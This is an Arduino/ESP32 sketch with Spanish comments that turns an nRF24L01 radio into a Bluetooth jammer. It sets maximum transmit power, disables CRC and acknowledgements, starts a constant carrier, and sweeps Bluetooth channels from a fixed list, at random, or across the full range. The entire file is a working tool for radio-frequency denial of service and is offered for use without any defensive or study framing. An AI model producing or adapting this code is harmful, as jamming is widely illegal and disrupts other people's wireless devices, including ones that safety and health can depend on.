#include <SPI.h>
#include "RF24.h"

// Configuración del radio
RF24 radio(22, 21, 16000000); // CE, CSN, SPI Speed (VSPI)
SPIClass* vspi = nullptr;

// Canales de Bluetooth (79 canales, 0-78)
byte bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};

// Método de jamming (puedes cambiar entre 0, 1 o 2)
int jam_method = 0; 
// 0 = Brute Force por lista (21 canales principales)
// 1 = Valores aleatorios (0-79)
// 2 = Brute Force completo (0-79)

void VSPI_init() {
  vspi = new SPIClass(VSPI);
  vspi->begin();
  vspi->setFrequency(16000000);
  vspi->setBitOrder(MSBFIRST);
  vspi->setDataMode(SPI_MODE0);
  
  radio.begin(vspi);
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
}

void VSPI_deinit() {
  if (vspi != nullptr) {
    vspi->end();
    delete vspi;
    vspi = nullptr;
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n=================================");
  Serial.println("  Bluetooth Jammer - Single Antenna");
  Serial.println("=================================\n");
  
  Serial.print("Método de jamming: ");
  switch(jam_method) {
    case 0:
      Serial.println("Brute Force por Lista (21 canales)");
      break;
    case 1:
      Serial.println("Valores Aleatorios (0-79)");
      break;
    case 2:
      Serial.println("Brute Force Completo (0-79)");
      break;
  }
  
  Serial.println("\nInicializando radio...");
  VSPI_init();
  
  // Iniciar portadora constante
  radio.startConstCarrier(RF24_PA_MAX, 45);
  
  Serial.println("¡Jamming iniciado!");
  Serial.println("Presiona CTRL+C para detener\n");
}

void loop() {
  switch(jam_method) {
    case 0: // Brute Force por lista
      for (int i = 0; i < 21; i++) {
        radio.setChannel(bluetooth_channels[i]);
        delayMicroseconds(100); // Pequeño delay entre cambios
      }
      break;
      
    case 1: // Aleatorio
      radio.setChannel(random(80));
      delayMicroseconds(100);
      break;
      
    case 2: // Brute Force completo
      for (int i = 0; i < 80; i++) {
        radio.setChannel(i);
        delayMicroseconds(100);
      }
      break;
  }
  
  // Información de debug cada 5 segundos
  static unsigned long lastPrint = 0;
  if (millis() - lastPrint > 5000) {
    Serial.print(".");
    lastPrint = millis();
  }
}